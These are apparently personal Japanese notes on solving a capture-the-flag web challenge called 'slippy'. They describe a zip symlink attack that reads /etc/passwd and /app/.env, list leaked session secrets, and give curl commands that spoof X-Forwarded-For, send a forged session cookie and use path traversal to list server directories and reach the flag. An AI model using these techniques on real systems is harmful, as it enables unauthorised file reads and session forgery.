https://chatgpt.com/c/68b27dbb-4f6c-8322-bd72-35f13b784fcb

# 起動

- ビルド: `docker build -t slippy .`
- 起動: `docker run --rm -it -p 3000:3000 slippy`

# symlink

symlink扱いのファイルをzipに入れてやると /etc/passwd はダウンロードすることはできた。
同じ容量で `$randdir/flag.txt` を取れる。が、$randdirがわからない。


session_secretはexfil_zipをzip uploadすることでとれた。
/app/.envが取れる。

SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b

server.jsも取れる。そこにあるのは
amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E



### 実験

debug/filesにアクセスする。

```shell
curl -si -H "X-Forwarded-For: 127.0.0.1" --cookie "connect.sid=s%3Abbbb.3dmQ7FK06v9OaanLaywlxUX%2BISUjT5psbk7OBqi5PGc" "http://localhost:3000/debug/files?session_id=develop"
```

これで通るは通る。x-forwared-forに127.0.0.1を設定してやるとipはクリアできる。

session_secretとsidが同じであれば何とかなりそう？何だけどそんなわけなさそう。



下記でルートのディレクトリを出せる。これでzipのrand_dirがわかる。

```shell
curl -si -H "X-Forwarded-For: 127.0.0.1" --cookie "connect.sid=s%3AamwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" "https://web-slippy-ccbfbf5f6168b10b.challs.tfcctf.com/debug/files?session_id=../.."
```


rand_dirがわかれば、symlink-attack.pyでflag.txtを取れる。




